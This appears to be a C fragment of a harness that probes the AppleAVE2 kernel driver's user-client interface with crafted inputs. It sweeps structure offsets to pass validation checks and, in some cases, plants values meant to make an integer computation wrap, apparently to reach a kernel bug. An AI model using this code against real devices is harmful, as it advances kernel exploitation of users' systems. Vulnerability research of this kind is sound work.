            case 6: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 0;
                    *(int32_t *)(d5 + AVE2_OFF_ENCTYPE) = 2; break;
            case 7: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 0;
                    *(int32_t *)(d5 + AVE2_OFF_WIDTH) = 4096;
                    *(int32_t *)(d5 + AVE2_OFF_HEIGHT) = 2160; break;
            }
            { /* v30: firmware async command drain — sleep + optional sel4 re-fire before sel5 */
              const char *dl = getenv("AVE2_S5DELAY");
              const char *rn = getenv("AVE2_S5RESEL4");
              int ms = dl ? atoi(dl) : 0;
              int re = rn ? atoi(rn) : 0;
              if (ms > 0) usleep(ms * 1000);
              for (int r = 0; r < re; r++) {
                  uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
                  const char *mp3 = patch; if (mp3) apply_patch(d4, mp3);
                  uint8_t o4[0x20]; size_t o4z=0x20; memset(o4,0xAA,sizeof(o4));
                  kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
                  if (ms > 0) usleep(ms * 1000);
                  printf("    [refire %d] sel4 -> 0x%08x\n", r, k4);
              }
            }
            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
            printf("    [s5-%d] sel5 -> 0x%08x osz=%zu out0:", casei, k5, o5z);
            for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
            printf("\n");
            sel4_p("s5post", c, 0, 0x1a0a0, NULL);
            { uint8_t d6[0x30]; memset(d6,0,sizeof(d6)); memcpy(d6,"904.76.7",8);
              uint8_t o6[0x20]; size_t o6z=0x20; memset(o6,0xAA,sizeof(o6));
              kern_return_t k6 = p_IOConnectCallStructMethod(c, 6, d6, 0x30, o6, &o6z);
              printf("    [s5-%d] sel6 -> 0x%08x\n", casei, k6); }
            destroy_close(c);
        }

        { /* v29: field probe scan — set one u32=1 at off, watch sel5 error move */
          static const uint32_t offs[] = {0,4,8,0xc,0x10,0x14,0x18,0x1c,0x20,0x24,0x2c,0x30,0x34,0x38,0x3c,0x40,0x48,0x50,0x60,0x80,0xa0,0x200,0x9c4,0x9cc,0x9ec,0x1a0a8};
          for (unsigned i = 0; i < sizeof(offs)/sizeof(offs[0]); i++) {
              if (create_session(m, &c) != 0) { printf("[-] create\n"); break; }
              fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
              sel4_p("sp", c, 0, 0x1a0a0, patch);
              uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
              memcpy(d5, stat_in, 0x1a0a0);
              *(uint32_t *)(d5 + 0x28) = 1;
              *(uint32_t *)(d5 + offs[i]) = 1;
              uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
              printf("    [scan +%#x] sel5 -> 0x%08x out0:", offs[i], k5);
              for (size_t q = 0; q < 8 && q < o5z; q++) printf("%02x", o5[q]);
              printf("\n");
              destroy_close(c);
          }
        }
        printf("=== start5 done ===\n");
    } else if (test != NULL && strcmp(test, "s5v") == 0) {
        /* v39: sel5 -1015 判据 = [codec_obj+0x78] == [session+0x3d38+0xa8].
           mdfn 里 x21=session+0x3d38, x1=codec+0x50 => x1+0x28=codec+0x78, x21+0xa8=session+0x3de0.
           猜 session+0x3d38 是 sel5 输入 +0x338 的拷贝 => 目标字段 sel5_in+0x3e0。扫 offset x value。
           命中判据: sel5 返回码 != 0xe0000001(-1015)。 */
        const char *patch = getenv("AVE2_MS_PATCH");
        int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        unsigned off = getenv("AVE2_S5V_OFF") ? (unsigned)strtoul(getenv("AVE2_S5V_OFF"), NULL, 0) : 0x3e0;
        unsigned lo  = getenv("AVE2_S5V_LO")  ? (unsigned)strtoul(getenv("AVE2_S5V_LO"), NULL, 0) : 0;
        unsigned hi  = getenv("AVE2_S5V_HI")  ? (unsigned)strtoul(getenv("AVE2_S5V_HI"), NULL, 0) : 0x40;
        int where = getenv("AVE2_S5V_WHERE") ? atoi(getenv("AVE2_S5V_WHERE")) : 0;
        printf("=== s5v: off=0x%x lo=0x%x hi=0x%x where=%d mode=%d ===\n", off, lo, hi, where, m);
        if (create_session(m, &c) != 0) { printf("[-] create\n"); return 42; }
        { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
          iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
          memset(out,0xAA,sizeof(out)); size_t o=0x20;
          kern_return_t kr = p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o);
          printf("    sel3 async -> 0x%08x\n", kr); }
        drain_wake(wake, 200);
        fill_cfg(0,1920,1080,2,1,0,0);
        sel4_p("st", c, 0, 0x1a0a0, patch);
        for (unsigned v = lo; v <= hi; v++) {
            uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
            if (off + 4 <= sizeof(d5)) *(uint32_t *)(d5 + off) = v;
            if (where) { uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
                         apply_patch_quiet(d4, patch);
                         if (off + 4 <= sizeof(d4)) *(uint32_t *)(d4 + off) = v;
                         uint8_t o4[0x20]; size_t o4z=0x20; memset(o4,0xAA,sizeof(o4));
                         p_IOConnectCallStructMethod(c,4,d4,sizeof(d4),o4,&o4z); }
            uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
            if (k5 != 0xe0000001u) {
                printf("    [HIT v=0x%x] sel5 -> 0x%08x %s osz=%zu out0:", v, k5, krname(k5), o5z);
                for (size_t q=0;q<16&&q<o5z;q++) printf("%02x", o5[q]);
                printf("\n");
            } else if (v==lo || v==hi) printf("    [v=0x%x] sel5 -> 0x%08x (baseline)\n", v, k5);
        }
        printf("=== s5v done ===\n");
        destroy_close(c);
    } else if (test != NULL && strcmp(test, "s5c") == 0) {
        /* v40: sweep CREATE input offsets: patch one u32=V, then sel3->sel4->sel5, watch sel5 code.
           -1015 判据 = [codec+0x78] == [session+0x3de0]; 会话侧字段多半在 create 时初始化，
           而 sel4/sel5 输入的单字段扫（s5scan/LADDER）已证明无关。 */
        const char *patch = getenv("AVE2_MS_PATCH");
        unsigned lo = getenv("AVE2_S5C_LO") ? (unsigned)strtoul(getenv("AVE2_S5C_LO"),NULL,0) : 0x20;
        unsigned hi = getenv("AVE2_S5C_HI") ? (unsigned)strtoul(getenv("AVE2_S5C_HI"),NULL,0) : 0x6f0;
        int vmax = getenv("AVE2_S5C_VMAX") ? atoi(getenv("AVE2_S5C_VMAX")) : 3;
        printf("=== s5c: create-in sweep 0x%x..0x%x vmax=%d ===\n", lo, hi, vmax);
        for (unsigned o = lo; o <= hi; o += 4) {
            for (int V = 1; V <= vmax; V++) {
                char spec[64]; snprintf(spec, sizeof(spec), "0x%lx:%d", o, V);
                setenv("AVE2_CPATCH", spec, 1);
                if (create_session(1, &c) != 0) continue;
                { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
                  iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
                  memset(out,0xAA,sizeof(out)); size_t o2=0x20;
                  p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
                drain_wake(wake, 50);
                fill_cfg(0,1920,1080,2,1,0,0);
                sel4_p("st", c, 0, 0x1a0a0, patch);
                { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
                  uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
                  kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
                  if (k5 != 0xe0000001u) {
                      printf("    [HIT create+0x%x=%d] sel5 -> 0x%08x %s osz=%zu out0:", o, V, k5, krname(k5), o5z);
                      for (size_t q=0;q<16&&q<o5z;q++) printf("%02x", o5[q]);
                      printf("\n");
                  } }
                destroy_close(c);
            }
        }
        unsetenv("AVE2_CPATCH");
        printf("=== s5c done ===\n");
    } else if (test != NULL && strcmp(test, "s4s") == 0) {
        /* v41: sweep CONFIGURE (sel4) input offsets; fresh session every N points.
           -1015 判据 = [P+0x78] == [session+0x3de0]。会话侧字段最可能来自 configure 输入；
           v34d 的 LADDER 判据把 -1015 排除在外（那时还没 sel3），结论无效，本模式重做。 */
        const char *ms = getenv("AVE2_MS_PATCH");
        unsigned lo = getenv("AVE2_S4S_LO") ? (unsigned)strtoul(getenv("AVE2_S4S_LO"),NULL,0) : 0x28;
        unsigned hi = getenv("AVE2_S4S_HI") ? (unsigned)strtoul(getenv("AVE2_S4S_HI"),NULL,0) : 0x1a0a0;
        int step = getenv("AVE2_S4S_STEP") ? atoi(getenv("AVE2_S4S_STEP")) : 16;
        int vmax = getenv("AVE2_S4S_VMAX") ? atoi(getenv("AVE2_S4S_VMAX")) : 1;
        int re = getenv("AVE2_S4S_RECREATE") ? atoi(getenv("AVE2_S4S_RECREATE")) : 4;
        printf("=== s4s: configure-in sweep 0x%x..0x%x step=%d vmax=%d recreate=%d ===\n", lo, hi, step, vmax, re);
        int since = 0;
        for (unsigned o = lo; o <= hi; o += step) {
            for (int V = 1; V <= vmax; V++) {
                if (since >= re) {
                    if (c) destroy_close(c);
                    since = 0;
                }
                if (since == 0) {
                    if (create_session(1, &c) != 0) { since = 0; continue; }
                    { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
                      iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
                      memset(out,0xAA,sizeof(out)); size_t o2=0x20;
                      p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
                    drain_wake(wake, 50);
                    since = 1;
                }
                fill_cfg(0,1920,1080,2,1,0,0);
                apply_patch_quiet(stat_in, ms);
                { char spec[64]; snprintf(spec, sizeof(spec), "0x%lx:%d", o, V);
                  apply_patch_quiet(stat_in, spec); }
                { uint8_t o4[0x20]; size_t o4z=0x20; memset(o4,0xAA,sizeof(o4));
                  kern_return_t k4 = p_IOConnectCallStructMethod(c,4,stat_in,0x1a0a0,o4,&o4z);
                  uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
                  uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
                  kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
                  if (k5 != 0xe0000001u || k4 != 0) {
                      printf("    [HIT cfg+0x%x=%d] sel4=0x%08x sel5=0x%08x %s\n", o, V, k4, k5, krname(k5));
                  } }
            }
        }
        if (c) destroy_close(c);
        printf("=== s4s done ===\n");
    } else if (test != NULL && strcmp(test, "sid") == 0) {
        /* v42: dump create/sel3 outs and try every u32 seen there as sel5 iUCInfoSID (+0x28). */
        const char *ms = getenv("AVE2_MS_PATCH");
        printf("=== sid: dump outs + try candidate SIDs ===\n");
        if (create_session(1, &c) != 0) { printf("[-] create\n"); return 42; }
        { uint32_t co[8]; memcpy(co, out, 32);
          printf("    create u32:"); for (int q=0;q<8;q++) printf(" %08x", co[q]); printf("\n");
          { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
            iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
            memset(out,0xAA,sizeof(out)); size_t o2=0x20;
            p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
          drain_wake(wake, 200);
          uint32_t so[8]; memcpy(so, out, 32);
          printf("    sel3  u32:"); for (int q=0;q<8;q++) printf(" %08x", so[q]); printf("\n");
          fill_cfg(0,1920,1080,2,1,0,0);
          sel4_p("st", c, 0, 0x1a0a0, ms);
          uint32_t cand[32]; int nc = 0;
          for (int q=0;q<8;q++) cand[nc++]=co[q];
          for (int q=0;q<8;q++) cand[nc++]=so[q];
          for (int q=0;q<nc;q++) {
              uint32_t v = cand[q];
              for (int sw=0; sw<2; sw++) {
                  uint32_t x = sw ? __builtin_bswap32(v) : v;
                  uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
                  *(uint32_t *)(d5 + 0x28) = x;
                  uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
                  kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
                  if (k5 != 0xe0000001u) printf("    [HIT sid=0x%08x sw=%d] sel5 -> 0x%08x %s\n", x, sw, k5, krname(k5));
              }
          }
          printf("    candidate scan done\n"); }
        destroy_close(c);
        printf("=== sid done ===\n");
    } else if (test != NULL && strcmp(test, "sid2") == 0) {
        /* v42: linked sweep: create-in field coff := V AND sel5-in field soff := V (same V).
           假设 Start 的 iUCInfoSID(+0x28) 必须等于 create 时登记的 UC info id。 */
        const char *ms = getenv("AVE2_MS_PATCH");
        unsigned coff = getenv("AVE2_SID2_COFF") ? (unsigned)strtoul(getenv("AVE2_SID2_COFF"),NULL,0) : 0x10;
        unsigned soff = getenv("AVE2_SID2_SOFF") ? (unsigned)strtoul(getenv("AVE2_SID2_SOFF"),NULL,0) : 0x28;
        unsigned vmax = getenv("AVE2_SID2_VMAX") ? (unsigned)strtoul(getenv("AVE2_SID2_VMAX"),NULL,0) : 0x400;
        printf("=== sid2: create+0x%x := V, sel5+0x%x := V, V=1..0x%x ===\n", coff, soff, vmax);
        for (unsigned V = 1; V <= vmax; V++) {
            char spec[64]; snprintf(spec, sizeof(spec), "0x%lx:%u", coff, V);
            setenv("AVE2_CPATCH", spec, 1);
            if (create_session(1, &c) != 0) continue;
            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
            drain_wake(wake, 50);
            fill_cfg(0,1920,1080,2,1,0,0);
            sel4_p("st", c, 0, 0x1a0a0, ms);
            { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
              if (soff + 4 <= sizeof(d5)) *(uint32_t *)(d5 + soff) = V;
              uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
              kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
              if (k5 != 0xe0000001u) printf("    [HIT V=0x%x] sel5 -> 0x%08x %s\n", V, k5, krname(k5)); }
            destroy_close(c);
        }
        unsetenv("AVE2_CPATCH");
        printf("=== sid2 done ===\n");
    } else if (test != NULL && strcmp(test, "surf") == 0) {
        /* v44: iUCInfoSID = IOSurface ID hypothesis.
           -1015 判据 = [driver_elem+0x28] == [session+0x3de0]; Start 输入 +0x28 = iUCInfoSID (>0).
           造一个真 IOSurface 拿全局 ID，然后 (a) sel5+0x28 := SID; (b) create 输入逐 offset := SID。 */
        {
            typedef void *(*iosurf_create_fn)(void *, size_t, size_t *);
            typedef uint32_t (*iosurf_id_fn)(void *);
            iosurf_create_fn isc = (iosurf_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
            iosurf_id_fn isg = (iosurf_id_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
            uint32_t SID = 0;
            if (isc != NULL && isg != NULL) {
                size_t bpr = 0;
                void *surf = isc(NULL, 4096, &bpr);
                if (surf != NULL) { SID = isg(surf); printf("    [surf] IOSurface id=%u (0x%x) bpr=%zu\n", SID, SID, bpr); }
                else printf("    [surf] IOSurfaceCreate returned NULL\n");
            } else printf("    [surf] dlsym IOSurface failed\n");
            const char *ms = getenv("AVE2_MS_PATCH");
            if (SID != 0) {
                /* (a) sel5 +0x28 := SID only */
                printf("=== surf(a): sel5+0x28 := %u ===\n", SID);
                if (create_session(1, &c) == 0) {
                    { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
                      iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
                      memset(out,0xAA,sizeof(out)); size_t o2=0x20;
                      p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
                    drain_wake(wake, 50);
                    fill_cfg(0,1920,1080,2,1,0,0);
                    sel4_p("st", c, 0, 0x1a0a0, ms);
                    { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
                      *(uint32_t *)(d5 + 0x28) = SID;
                      uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
                      kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
                      printf("    sel5 -> 0x%08x %s osz=%zu\n", k5, krname(k5), o5z); }
                    destroy_close(c);
                }
                /* (b) sweep create-in offsets := SID */
                printf("=== surf(b): create-in sweep := %u ===\n", SID);
                for (unsigned o = 0x20; o <= 0x6f0; o += 4) {
                    char spec[64]; snprintf(spec, sizeof(spec), "0x%lx:%u", o, SID);
                    setenv("AVE2_CPATCH", spec, 1);
                    if (create_session(1, &c) != 0) continue;
                    { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
                      iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
                      memset(out,0xAA,sizeof(out)); size_t o2=0x20;
                      p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
                    drain_wake(wake, 50);
                    fill_cfg(0,1920,1080,2,1,0,0);
                    sel4_p("st", c, 0, 0x1a0a0, ms);
                    { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
                      *(uint32_t *)(d5 + 0x28) = SID;
                      uint8_t o5[0x150]; size_t o5z=0x150; memset(o5,0xAA,sizeof(o5));
                      kern_return_t k5 = p_IOConnectCallStructMethod(c,5,d5,sizeof(d5),o5,&o5z);
                      if (k5 != 0xe0000001u) printf("    [HIT create+0x%x=%u] sel5 -> 0x%08x %s\n", o, SID, k5, krname(k5)); }
                    destroy_close(c);
                }
                unsetenv("AVE2_CPATCH");
            }
            printf("=== surf done ===\n");
        }
    } else if (test != NULL && strcmp(test, "hdr5") == 0) {
        /* v45: AVE_Client_Check_Start @0x1a25d70 头三行:
              0x1a25d94 ldr w8,[x20,#4] ; 0x1a25d98 cmp w8,#5 ; b.ne -> "mismatched command type" -> -1015
           且 0x10 + 0x1a0a0 == 0x1a0b0 精确成立
           => Start 输入 = 16 字节命令头(+0x04=eUCCmd=AVE_UCCmd_Start=5) + 完整 Prepare 结构体
           此前所有 sel5 尝试都把 Prepare 结构体放在 +0x00，整体错位 0x10。 */
        const char *patch = getenv("AVE2_MS_PATCH");
        int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        printf("=== hdr5: create m%d -> sel4 -> sel5 with 16-byte cmd header ===\n", m);
        for (int casei = 0; casei < 8; casei++) {
            if (create_session(m, &c) != 0) { printf("[-] create at case %d\n", casei); break; }
            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
            drain_wake(wake, 50);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            sel4_p("h5pre", c, 0, 0x1a0a0, patch);
            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
            uint8_t sub[0x1a0a0]; memset(sub, 0, sizeof(sub));
            memcpy(sub, stat_in, 0x1a0a0);
            if (patch) apply_patch(sub, patch);
            if (casei == 7) {
                /* LRB 回绕配方：flags=1(s=2) B=C=0x10000 D=E=4 => X=Y=0x10000, F3 回绕 0 */
                *(uint32_t *)(sub + 0x254) = 1;
                *(uint32_t *)(sub + 0x25c) = 0x10000;
                *(uint32_t *)(sub + 0x260) = 0x10000;
                *(uint32_t *)(sub + 0x264) = 4;
                *(uint32_t *)(sub + 0x268) = 4;
            }
            if (casei == 6) {
                /* 对照：不搬移，结构体仍在 +0，只把 +0x04 写成 5 */
                memcpy(d5, sub, 0x1a0a0);
                *(uint32_t *)(d5 + 0x04) = 5;
            } else {
                memcpy(d5 + 0x10, sub, 0x1a0a0);
                static const uint32_t hdr[8][4] = {
                    {0,5,0,0},{0,0,0,0},{0,4,0,0},{0,6,0,0},
                    {1,5,0,0},{0,5,0,8},{0,5,0,0},{0,5,0,0}
                };
                *(uint32_t *)(d5 + 0x00) = hdr[casei][0];
                *(uint32_t *)(d5 + 0x04) = hdr[casei][1];
                *(uint32_t *)(d5 + 0x08) = hdr[casei][2];
                *(uint32_t *)(d5 + 0x0c) = hdr[casei][3];
            }
            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
            printf("    [h5-%d] sel5 -> 0x%08x %s osz=%zu out0:", casei, k5, krname(k5), o5z);
            for (size_t q = 0; q < 24 && q < o5z; q++) printf("%02x", o5[q]);
            printf("\n");
            if (k5 == 0) {
                uint8_t d6[0x30]; memset(d6,0,sizeof(d6)); memcpy(d6,"904.76.7",8);
                uint8_t o6[0x20]; size_t o6z=0x20; memset(o6,0xAA,sizeof(o6));
                kern_return_t k6 = p_IOConnectCallStructMethod(c,6,d6,sizeof(d6),o6,&o6z);
                printf("    [h5-%d] sel6 after start -> 0x%08x %s\n", casei, k6, krname(k6));
            }
            destroy_close(c);
        }
        printf("=== hdr5 done ===\n");
    } else if (test != NULL && strcmp(test, "sid5") == 0) {
        /* v47: AVE_UCCmd_CheckParam_Start (@0x1b99034 / wrapper @0x1b99034 family) reads Start own fields:
              +0x04 eUCCmd == 5 | +0x10 iDataCnt s64>=0 | +0x18 iTimeOut s64>=0 | +0x20 iStartTime s64>=0
              +0x28 iUCInfoSID u32!=0 | +0xa0a8 iUCInfoIdx s32>=0
           => common header is 0x30, not 0x10 (0x1a0b0 - 0x30 = 0x1a080 payload).
           Failure tail 0x1b99248 always does mov w22,#-0x3e9 (-1001), so the return code cannot tell
           which field failed => isolate one field per case. v46 ordering bug fixed here: copy the
           payload FIRST, then write header fields (v46 wrote the header first and the memcpy of the
           Prepare body overwrote +0x10..+0x28 with the version string). */
        const char *patch = getenv("AVE2_MS_PATCH");
        printf("=== sid5 v47: Start header 0x30, per-field isolation ===\n");
        for (int ci = 0; ci < 10; ci++) {
            size_t lay = 0x30;
            int copyPayload = 1; uint32_t SIDv = 1u; int64_t dc = 1, to = 0, st = 0; int lrb = 0;
            if (ci == 0) copyPayload = 0;                     /* header only */
            if (ci == 1) SIDv = 0u;                           /* SID=0 control */
            if (ci == 2) dc = 0;                              /* iDataCnt = 0 */
            if (ci == 3) to = 1;                              /* iTimeOut = 1 */
            if (ci == 4) st = 1;                              /* iStartTime = 1 */
            if (ci == 5) lay = 0x10;                          /* header-0x10 hypothesis */
            if (ci == 6) lay = 0x40;
            if (ci == 7) { copyPayload = 0; SIDv = 0x132eu; }  /* header only + real SID */
            if (ci == 8) lrb = 1;                             /* payload carries LRB wrap recipe */
            char tag[40]; snprintf(tag, sizeof(tag), "C%d lay%zx cp%d SID%x", ci, lay, copyPayload, SIDv);
            if (create_session(1, &c) != 0) { printf("[-] create\n"); goto s5done; }
            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
            drain_wake(wake, 50);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            sel4_p(tag, c, 0, 0x1a0a0, patch);
            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
            if (copyPayload) memcpy(d5 + lay, stat_in, 0x1a0a0 - lay);
            *(uint32_t *)(d5 + 0x04) = 5;
            *(int64_t  *)(d5 + 0x10) = dc;
            *(int64_t  *)(d5 + 0x18) = to;
            *(int64_t  *)(d5 + 0x20) = st;
            *(uint32_t *)(d5 + 0x28) = SIDv;
            *(int32_t  *)(d5 + 0xa0a8) = 0;
            if (lrb) {
                *(uint32_t *)(d5 + 0x264) = 1;
                *(uint32_t *)(d5 + 0x26c) = 0x10000;
                *(uint32_t *)(d5 + 0x270) = 0x10000;
                *(uint32_t *)(d5 + 0x274) = 4;
                *(uint32_t *)(d5 + 0x278) = 4;
            }
            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
            printf("    [%s%s] sel5 -> 0x%08x %s osz=%zu out0:", tag, lrb?" LRB":"", k5, krname(k5), o5z);
            for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
            printf("\n");
            destroy_close(c);
        }
s5done:
        printf("=== sid5 done ===\n");
    } else {
        /* default battery: enctype sweep + no-create ladder */
        printf("\n=== S1 create m1: enctype sweep (static) ===\n");
        if (create_session(1, &c) == 0) {
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4_p("e1/full", c, 0, 0x1a0a0, NULL);
            fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4_p("e0/full", c, 0, 0x1a0a0, NULL);
            fill_cfg(0, 1920, 1080, 2, 2, 0, 0); sel4_p("e2/full", c, 0, 0x1a0a0, NULL);
            destroy_close(c);
        }
        printf("\n=== S5 no create: gate ladder ===\n");
        if (p_IOServiceOpen(svc, mach_task_self(), g_opentype, &c) == 0) {
            fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4_p("S5/P6e0", c, 0, 0x38, NULL);
            fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4_p("S5/P7e0", c, 0, 0x28, NULL);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4_p("S5/P6e1", c, 0, 0x38, NULL);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4_p("S5/P7e1", c, 0, 0x28, NULL);
            p_IOServiceClose(c);
        }
    }

    munmap(anon, sizeof(anon_in));
    if (wake) mach_port_deallocate(mach_task_self(), wake);
    p_IOObjectRelease(svc);
    return 42;
}
